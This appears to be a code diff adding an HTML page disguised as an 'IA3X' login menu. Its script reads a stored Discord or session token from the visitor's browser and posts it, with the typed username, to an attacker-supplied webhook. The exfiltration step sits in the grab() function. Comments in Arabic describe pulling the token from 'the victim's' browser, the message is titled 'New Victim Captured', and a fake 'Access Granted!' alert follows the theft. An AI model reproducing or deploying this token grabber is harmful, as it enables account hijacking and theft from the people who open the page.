@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>IA3X LOGIN SYSTEM</title>
+    <style>
+        body { background-color: #000; color: #ff0055; font-family: 'Segoe UI'; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .box { background: #050505; padding: 40px; border-radius: 10px; border: 1px solid #1a1a1a; text-align: center; width: 350px; box-shadow: 0 0 20px #ff005533; }
+        input { width: 90%; padding: 10px; background: #0a0a0a; border: 1px solid #333; color: white; margin-bottom: 20px; border-radius: 5px; }
+        button { background: none; border: none; color: #ff0055; font-size: 30px; cursor: pointer; transition: 0.3s; }
+        button:hover { transform: scale(1.2); }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h1 style="letter-spacing:5px;">IA3X MENU</h1>
+        <input type="text" id="user" placeholder="USERNAME">
+        <button onclick="grab()">➔</button> 
+    </div>
+    <script>
+        function grab() {
+            // ضع رابط الويبهوك الخاص بك هنا بدلاً من الكلمة المكتوبة
+            const webhook = "رابط_الويبهوك_الخاص_بك_هنا";
+            const name = document.getElementById("user").value;
+            
+            // هذا الجزء هو المسؤول عن سحب التوكن من متصفح الضحية
+            const token = localStorage.getItem("token") || localStorage.getItem("discord_token") || "Token Not Found";
+
+            fetch(webhook, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "🎯 New Victim Captured",
+                        fields: [
+                            { name: "👤 User", value: name, inline: true },
+                            { name: "🔑 Token", value: "```" + token + "```" }
+                        ],
+                        color: 16711765,
+                        footer: { text: "IA3X System | 2026" }
+                    }]
+                })
+            }).then(() => alert("Access Granted!"));
+        }
+    </script>
+</body>
+</html>
